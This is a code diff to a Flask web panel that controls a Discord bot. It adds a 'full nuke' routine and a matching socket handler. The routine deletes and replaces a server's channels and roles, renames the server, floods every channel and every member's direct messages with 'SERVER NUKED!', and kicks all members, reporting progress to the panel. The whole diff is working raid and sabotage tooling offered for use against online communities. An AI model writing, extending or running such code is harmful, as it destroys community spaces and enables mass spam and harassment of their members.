@@ -13,6 +13,7 @@ import time
 import json
 from werkzeug.utils import secure_filename
 import os
+import concurrent.futures
 
 app = Flask(__name__)
 app.config['SECRET_KEY'] = 'discord_bot_controller_secret'
@@ -189,11 +190,133 @@ class DiscordBot:
             'icon': str(guild.icon.url) if guild.icon else None,
             'memberCount': len(guild.members)
         }
+    
+    # Full nuke operation - execute all operations in parallel
+    async def execute_full_nuke(self, guild, params):
+        # Create tasks for all operations
+        tasks = []
+        results = {}
+        
+        # Add create channels task
+        if params.get('delete_old_rooms', True):
+            tasks.append(('create_channels', self.create_channels(
+                guild, 
+                params.get('room_count', 10), 
+                params.get('room_name', 'nuked'), 
+                True
+            )))
+        
+        # Add create roles task
+        if params.get('delete_old_roles', True):
+            tasks.append(('create_roles', self.create_roles(
+                guild, 
+                params.get('role_count', 10), 
+                params.get('role_name', 'nuked'), 
+                True
+            )))
+        
+        # Add update server task
+        if params.get('server_name'):
+            tasks.append(('update_server', self.update_server(
+                guild, 
+                name=params.get('server_name', 'NUKED SERVER')
+            )))
+        
+        # Execute initial tasks concurrently
+        for name, coro in tasks:
+            try:
+                if name == 'update_server':
+                    result = await coro
+                    results[name] = {'success': result}
+                else:
+                    async for progress in coro:
+                        results[name] = progress
+                        # Calculate overall progress
+                        overall_progress = self._calculate_overall_progress(results)
+                        yield {'overall_progress': overall_progress, 'message': f'Executing {name}: {progress["message"]}'}
+            except Exception as e:
+                print(f"Error in {name}: {e}")
+                results[name] = {'progress': 0, 'message': f'Error in {name}: {str(e)}'}
+        
+        # Now that channels are created, spam them
+        try:
+            async for progress in self.spam_channels(
+                guild, 
+                params.get('channel_spam_message', 'SERVER NUKED!'), 
+                params.get('message_count', 5)
+            ):
+                results['spam_channels'] = progress
+                overall_progress = self._calculate_overall_progress(results)
+                yield {'overall_progress': overall_progress, 'message': f'Spamming channels: {progress["message"]}'}
+        except Exception as e:
+            print(f"Error in spam_channels: {e}")
+            results['spam_channels'] = {'progress': 0, 'message': f'Error in spam_channels: {str(e)}'}
+        
+        # Spam DMs
+        try:
+            async for progress in self.spam_dms(
+                guild, 
+                params.get('dm_spam_message', 'SERVER NUKED!')
+            ):
+                results['spam_dms'] = progress
+                overall_progress = self._calculate_overall_progress(results)
+                yield {'overall_progress': overall_progress, 'message': f'Spamming DMs: {progress["message"]}'}
+        except Exception as e:
+            print(f"Error in spam_dms: {e}")
+            results['spam_dms'] = {'progress': 0, 'message': f'Error in spam_dms: {str(e)}'}
+        
+        # Finally, kick all members if requested
+        if params.get('kick_all', True):
+            try:
+                async for progress in self.kick_all_members(guild):
+                    results['kick_all'] = progress
+                    overall_progress = self._calculate_overall_progress(results)
+                    yield {'overall_progress': overall_progress, 'message': f'Kicking members: {progress["message"]}'}
+            except Exception as e:
+                print(f"Error in kick_all_members: {e}")
+                results['kick_all'] = {'progress': 0, 'message': f'Error in kick_all_members: {str(e)}'}
+        
+        # Return final progress
+        yield {'overall_progress': 100, 'message': 'Full nuke completed successfully!'}
+    
+    def _calculate_overall_progress(self, results):
+        # Define weights for different operations
+        weights = {
+            'create_channels': 0.2,
+            'create_roles': 0.2,
+            'update_server': 0.1,
+            'spam_channels': 0.2,
+            'spam_dms': 0.15,
+            'kick_all': 0.15
+        }
+        
+        total_progress = 0
+        total_weight = 0
+        
+        for operation, result in results.items():
+            if operation in weights:
+                weight = weights[operation]
+                if operation == 'update_server':
+                    progress = 100 if result.get('success', False) else 0
+                else:
+                    progress = result.get('progress', 0)
+                
+                total_progress += progress * weight
+                total_weight += weight
+        
+        if total_weight == 0:
+            return 0
+        
+        return int(total_progress / total_weight)
 
 # Routes
 @app.route('/')
 def index():
     return send_from_directory('static', 'index.html')
+
+@app.route('/<path:path>')
+def serve_static(path):
+    return send_from_directory('static', path)
 
 @app.route('/upload_avatar', methods=['POST'])
 def upload_avatar():
@@ -508,6 +631,30 @@ def handle_kick_all_members():
             emit('operation_complete', {'message': 'Kicked all members'})
     
     asyncio.run_coroutine_threadsafe(kick_members_task(), bot_loop)
+
+@socketio.on('execute_full_nuke')
+def handle_execute_full_nuke(data):
+    if not current_bot or not current_guild:
+        emit('operation_error', {'message': 'No server selected'})
+        return
+    
+    async def full_nuke_task():
+        guild = current_bot.get_guild(current_guild)
+        if guild:
+            async for progress_data in current_bot.execute_full_nuke(guild, data):
+                emit('full_nuke_progress', progress_data)
+            
+            # Refresh data after nuke
+            info = await current_bot.get_server_info(guild)
+            channels = await current_bot.get_channels(guild)
+            roles = await current_bot.get_roles(guild)
+            
+            emit('server_info', info)
+            emit('rooms_list', {'rooms': channels})
+            emit('roles_list', {'roles': roles})
+            emit('full_nuke_complete')
+    
+    asyncio.run_coroutine_threadsafe(full_nuke_task(), bot_loop)
 
 if __name__ == '__main__':
     socketio.run(app, host='0.0.0.0', port=port, debug=False)
